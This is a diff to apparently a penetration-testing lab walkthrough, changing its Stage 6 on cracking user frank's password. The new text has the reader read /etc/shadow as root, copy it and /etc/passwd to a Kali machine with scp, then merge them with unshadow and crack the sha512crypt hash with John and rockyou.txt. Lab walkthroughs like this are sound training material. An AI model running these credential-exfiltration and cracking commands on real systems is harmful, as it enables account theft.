@@ -272,17 +272,22 @@ whoami
 
 ## Stage 6 — Crack `frank`'s password (the goal)
 
-As root, combine the password and shadow files and crack frank's `$6$` (sha512crypt) hash:
+Now that you're root you can finally read `/etc/shadow`, where frank's `$6$` (sha512crypt) hash lives. Do the actual cracking on **Kali**, which already ships `unshadow`, John, and the `rockyou.txt` wordlist — no need to install anything on the target.
+
+**On the target (as root)** — copy the two files off the box. Either `scp` them to Kali:
 
 ```bash
-unshadow /etc/passwd /etc/shadow > /tmp/unshadowed.txt
+scp /etc/passwd /etc/shadow vagrant@192.168.56.20:/tmp/
+```
 
-# John:
-john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.txt
-john --show /tmp/unshadowed.txt
+or just `cat /etc/passwd` and `cat /etc/shadow` and paste each into a matching file on Kali.
 
-# or hashcat (sha512crypt = mode 1800):
-hashcat -m 1800 -a 0 frank_hash.txt /usr/share/wordlists/rockyou.txt
+**On Kali** — merge the two files with `unshadow`, then crack:
+
+```bash
+unshadow /tmp/passwd /tmp/shadow > unshadowed.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+john --show unshadowed.txt
 ```
 
 frank's password is in `rockyou.txt`:
